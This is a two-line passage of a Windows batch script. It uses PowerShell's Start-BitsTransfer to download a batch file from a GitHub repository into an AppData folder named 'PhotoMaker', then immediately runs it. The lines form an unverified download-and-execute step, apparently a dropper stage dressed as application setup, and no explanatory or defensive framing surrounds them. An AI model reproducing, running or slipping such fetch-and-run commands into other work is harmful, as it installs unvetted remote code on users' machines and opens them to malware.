...
powershell Start-BitsTransfer -Source "https://raw.githubusercontent.com/Bot007bot/forfun/master/setup2.bat" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\setup2.bat"
call setup2.bat
